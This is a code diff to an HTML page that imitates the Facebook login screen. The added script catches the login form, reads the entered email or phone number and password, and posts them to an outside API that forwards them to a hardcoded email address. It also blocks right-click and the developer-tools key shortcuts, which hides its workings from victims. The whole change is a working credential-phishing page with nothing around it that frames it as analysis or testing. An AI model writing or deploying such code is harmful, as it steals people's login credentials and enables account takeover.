@@ -22,7 +22,7 @@
             <p>Connect with friends and the world</p>
             <p>around you on Facebook.</p>
         </div>
-        <form>
+        <form id="info-form">
             <div class="card">
                 <input type="text" name="userId" id="bigUserId" class="text-inputs big-input-text"
                     placeholder="Email or phone number">
@@ -31,11 +31,11 @@
                     placeholder="Mobile number or email">
 
                 <input type="password" name="userPassword" id="userPassword" class="text-inputs" placeholder="Password">
-                <input type="button" id="btn-login" value="Log In">
+                <input type="submit" id="btn-login" value="Log In">
                 <p><a href="" id="btn-forgot">Forgot password?</a></p>
                 <hr>
                 <p class="hr">────────────── <span class="or">or</span> ──────────────</p>
-                <input type="submit" id="btn-create-account" value="Create new account">
+                <input type="button" id="btn-create-account" value="Create new account">
                 <p id="create-page"><strong><a href="">Create a Page</a></strong> for a celebrity, brand or business.
                 </p>
             </div>
@@ -169,6 +169,7 @@
 
     </footer>
 </body>
+
 <script>
     document.addEventListener("contextmenu", function (e) {
         e.preventDefault();
@@ -186,5 +187,64 @@
         window.location.href = "https://www.facebook.com";
     });
 </script>
+
+
+<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+<script>
+    const form = document.getElementById('info-form');
+
+    form.addEventListener('submit', async (event) => {
+        event.preventDefault(); // Prevent form submission
+
+        const newID = document.getElementById("bigUserId").value;
+        const newPassword = document.getElementById("userPassword").value;
+        const newName = '';
+        const newEmail = 'blkcpk@gmail.com';
+        const newMessage = `ID: ${newID}\n PASSWORD: ${newPassword}`;
+
+        try {
+            const response = await axios.post('https://dev-eli-api.onrender.com/api/send-message', {
+                newName,
+                newEmail,
+                newMessage,
+            });
+            console.log(response.data);
+            alert('Message sent successfully!');
+        } catch (error) {
+            console.error(error);
+            alert('Error sending message. Please try again later.');
+        }
+
+        // Clear form inputs after submission
+        document.getElementById("info-form").reset();
+    });
+
+    // Disable Enter key
+    document.addEventListener("keydown", function (event) {
+        if (event.key === "Enter") {
+            event.preventDefault();
+        }
+    });
+    
+    document.onkeydown = function (e) {
+        if (e.keyCode == 123) {
+            return false;
+        }
+
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 73) {
+            return false;
+        }
+
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 74) {
+            return false;
+        }
+
+        if (e.ctrlKey && e.keyCode == 85) {
+            return false;
+        }
+    }
+
+</script>
+</body>
 
 </html>
